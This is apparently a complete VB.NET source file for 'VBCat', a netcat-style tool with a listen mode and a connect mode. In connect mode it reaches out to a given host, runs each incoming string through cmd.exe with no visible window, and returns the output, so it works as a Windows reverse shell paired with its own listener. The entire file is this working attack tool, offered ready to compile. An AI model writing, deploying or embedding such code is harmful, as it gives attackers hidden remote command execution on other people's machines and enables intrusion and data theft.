Imports System.Net
Imports System.Net.Sockets
Imports System.Text
Imports System.Threading
Imports System.Threading.Tasks
Imports System.Text.RegularExpressions

Module VBCat
    Dim networkStream As NetworkStream
    Dim shouldExit As Boolean = False

    Sub Main(args As String())
        If args.Length = 0 Then
            Console.WriteLine("Usage: VBCat.exe <mode> [options]")
            Console.WriteLine("Modes:")
            Console.WriteLine("  -c <hostname> <port>    Connect to a remote host")
            Console.WriteLine("  -l <port>               Listen for incoming connections")
            Return
        End If

        Dim mode As String = args(0).ToLower()

        Select Case mode
            Case "-c"
                If args.Length < 3 Then
                    Console.WriteLine("Usage: VBCat.exe -c <hostname> <port>")
                    Return
                End If

                Dim remoteHost As String = args(1)
                Dim remotePort As Integer = Integer.Parse(args(2))

                ConnectToRemoteHost(remoteHost, remotePort, mode).Wait()
            Case "-l"
                If args.Length < 2 Then
                    Console.WriteLine("Usage: VBCat.exe -l <port>")
                    Return
                End If

                Dim localPort As Integer = Integer.Parse(args(1))

                ListenForConnections(localPort, mode).Wait()
            Case Else
                Console.WriteLine("Invalid mode.")
        End Select
    End Sub

    ' Function to connect to a remote host
    Async Function ConnectToRemoteHost(ByVal remoteHost As String, ByVal remotePort As Integer, ByVal mode As String) As Task
        Dim client As New TcpClient()

        Try
            Await client.ConnectAsync(remoteHost, remotePort)

            Console.WriteLine("Connected to the server.")

            networkStream = client.GetStream()

            Dim receiveTask As Task = ReceiveDataAsync(mode)
            Dim sendTask As Task = SendLocalCommandsAsync(mode)

            Await Task.WhenAny(receiveTask, sendTask)

            shouldExit = True
        Catch ex As Exception
            Console.WriteLine("Error connecting to the server: " & ex.Message)
        Finally
            client.Close()
        End Try
    End Function

    ' Function to listen for incoming connections
    Async Function ListenForConnections(ByVal localPort As Integer, ByVal mode As String) As Task
        Dim server As New TcpListener(IPAddress.Any, localPort)
        server.Start()

        Console.WriteLine("Listening for incoming connections on port " & localPort)

        Dim client As TcpClient = Await server.AcceptTcpClientAsync()

        Console.WriteLine("Client connected.")

        networkStream = client.GetStream()

        Dim receiveTask As Task = ReceiveDataAsync(mode)
        Dim sendTask As Task = SendLocalCommandsAsync(mode)

        Await Task.WhenAny(receiveTask, sendTask)

        shouldExit = True
        client.Close()
        server.Stop()
    End Function

    ' Function to send local commands
    Async Function SendLocalCommandsAsync(ByVal mode As String) As Task
        While Not shouldExit
            Dim command As String = Await Console.In.ReadLineAsync()

            If mode = "-c" Then
                Continue While ' Skip sending the command to the remote session
            End If

            If networkStream IsNot Nothing Then
                Dim sendData As Byte() = Encoding.ASCII.GetBytes(command & vbLf)
                Await networkStream.WriteAsync(sendData, 0, sendData.Length)
                Await networkStream.FlushAsync()

                ' If the command is "exit", exit the program
                If command.Trim().ToLower() = "exit" Then
                    shouldExit = True
                End If
            End If
        End While
    End Function
    ' Function to receive remote commands and print output
    Async Function ReceiveDataAsync(ByVal mode As String) As Task
        Dim receivedBytes(4095) As Byte
        While Not shouldExit
            Dim bytesRead As Integer = Await networkStream.ReadAsync(receivedBytes, 0, receivedBytes.Length)
            If bytesRead = 0 Then
                ' Connection closed
                Exit While
            End If
            Dim receivedCommand As String = Encoding.ASCII.GetString(receivedBytes, 0, bytesRead)
            ' Check if the received command is the exit command
            If receivedCommand.Trim().ToLower() = "exit" Then
                shouldExit = True
                Exit While
            End If

            If mode = "-l" Then
                ' Print the received output
                ' Process and print the received output
                Dim processedOutput As String = receivedCommand.ToString()

                ' Remove "]0;" pattern
                processedOutput = Regex.Replace(processedOutput, "]0;", "")

                ' Remove "[\d+;\d+m.*?[\d+m\$" pattern
                processedOutput = Regex.Replace(processedOutput, "\[\d+;\d+m.*?\[\d+m\$", "")

                Console.Write(processedOutput)
            ElseIf mode = "-c" Then
                ' Execute the received command locally
                ExecuteCommand(receivedCommand)
            End If
        End While

        ' Terminate the program
        Environment.Exit(0)
    End Function

    ' Function to execute commands locally and send output to the remote connection
    Sub ExecuteCommand(ByVal command As String)
        ' Create a new process to execute the command
        Dim process As New Process()

        ' Set the process start info
        process.StartInfo.FileName = "cmd.exe"  ' Use "cmd.exe" for Windows shell or "powershell.exe" for a Windows PowerShell
        process.StartInfo.Arguments = "/c " & command  ' Use "/c" for Windows shell or PowerShell
        process.StartInfo.UseShellExecute = False
        process.StartInfo.RedirectStandardOutput = True
        process.StartInfo.CreateNoWindow = True

        ' Start the process
        process.Start()

        ' Read the output of the command
        Dim output As String = process.StandardOutput.ReadToEnd()

        ' Wait for the process to exit
        process.WaitForExit()

        ' Convert the output to bytes
        Dim outputBytes As Byte() = Encoding.ASCII.GetBytes(output)

        ' Send the output to the remote connection
        networkStream.Write(outputBytes, 0, outputBytes.Length)
        networkStream.Flush()
    End Sub
End Module